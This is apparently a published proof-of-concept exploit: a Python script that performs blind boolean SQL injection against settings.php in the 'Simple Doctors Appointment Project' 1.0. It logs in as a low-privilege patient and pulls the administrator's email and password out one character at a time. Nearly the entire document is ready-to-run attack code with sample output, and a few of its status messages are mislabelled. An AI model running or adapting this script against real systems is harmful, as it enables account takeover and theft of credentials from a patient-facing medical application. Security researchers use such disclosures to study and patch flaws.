# Exploit Title: SQL Injection on settings.php leading to password disclosure (admin)
# Date: 10/6/2022
# Exploit Author: evdaez
# Vendor Homepage: https://www.sourcecodester.com/hashenudara/simple-doctors-appointment-project.html
# Software Link: https://www.sourcecodester.com/hashenudara/simple-doctors-appointment-project.html
# Version: 1.0
# Tested on: XAMPP Windows 10
'''
[+] Successfully logged in.
[+] Cookie - dotc3sq4ao7je90jp8c631j8f4
[+] Guessing password length for user:
[+] Length of password: 8
[+] Guessing user's password:
[+] Password: P@ssw0rd
'''
import requests
import os

def clearScreen():
    currentOS = os.name

    if currentOS == "nt":
        os.system('cls')
    elif currentOS == "posix":
        os.system('clear')

def login():
    data = {
        "useremail": username,
        "userpassword": password
    }

    sess = requests.session() # sess - session
    loginUrl = f"http://{target}/login.php"
    req = sess.post(loginUrl, headers=headers, data=data, proxies=proxies, verify=False) # req - request

    if loginSuccessString in req.text:
        print("[+] Successfully logged in.")
        print(f"[+] Cookie - {sess.cookies['PHPSESSID']}")
        return sess
    else:
        print("[-] Login failed.")
        raise SystemExit

def getAdminEmailLength():
    print('[+] Guessing admin\'s email length:')

    for i in range(1, 17, 1):
        sqli_url = f"http://{target}/patient/settings.php?action=view&id=1' and (select length(aemail) from admin limit 1)={i} and 'a'='a"
        req = sess.get(sqli_url, headers=headers, proxies=proxies, verify=False)

        if successStringSQLi in req.text:
            print(f"[+] Length of admin's email: {i}")
            break

    return i # Return password length    

def getPwLength():
    print('[+] Guessing password length for admin:')

    for i in range(1, 17, 1):
        sqli_url = f"http://{target}/patient/settings.php?action=view&id=1' and (select length(apassword) from admin limit 1)={i} and 'a'='a"
        req = sess.get(sqli_url, headers=headers, proxies=proxies, verify=False)

        if successStringSQLi in req.text:
            print(f"[+] Length of password: {i}")
            break

    return i # Return password length

def getAdminEmail():
    adminEmail = ''
    print('[+] Guessing admin\'s password:')

    # Outer loop - Encompass the admin's email length
    for i in range(1, emailLength +1, 1):
        # Inner loop - Printable characthers 
        for c in range(33, 127, 1):
            sqli_url = f"http://{target}/patient/settings.php?action=view&id=1' and (select ascii(substring((select aemail from admin limit 1),{i},1))={c}) and 'a'='a"
            req = sess.get(sqli_url, headers=headers, proxies=proxies, verify=False)

            if successStringSQLi in req.text:
                adminEmail += chr(c)
                print(f"[+] Admin's email: {adminEmail}", end='\r', flush=False)
                break
    
    print(f"[+] Admin's email: {adminEmail}")    

def getPassword():
    userPassword = ''
    print('[+] Guessing admin\'s email:')

    # Outer loop - Encompass the password length
    for i in range(1, pwLength +1, 1):
        # Inner loop - Printable characthers 
        for c in range(33, 127, 1):
            sqli_url = f"http://{target}/patient/settings.php?action=view&id=1' and (select ascii(substring((select apassword from admin limit 1),{i},1))={c}) and 'a'='a"
            req = sess.get(sqli_url, headers=headers, proxies=proxies, verify=False)

            if successStringSQLi in req.text:
                userPassword += chr(c)
                print(f"[+] Password: {userPassword}", end='\r', flush=False)
                break
    
    print(f"[+] Password: {userPassword}")

if __name__ == "__main__":
    clearScreen()
   
    # For burp
    proxies = {
        "http":"http://127.0.0.1:8080",
        "https":"https://127.0.0.1:8080"
    }

    # Simulate real browser header
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36'
    }

    target = "192.168.2.209"
    username = "patient@edoc.com"
    password = "password"

    # It is crucial to know what does a successful login looks like. 
    # As for the SQLi success string, a true would mean that the patient view details isn't empty.
    loginSuccessString = "any idea about doctors"
    successStringSQLi = '0120000000'

    # Step 1 - Login as restricted user
    sess = login()

    # Step 2 - Get admin's email
    emailLength = getAdminEmailLength()
    getAdminEmail()
    
    # Step 3 - Get admin's password
    pwLength = getPwLength()
    getPassword()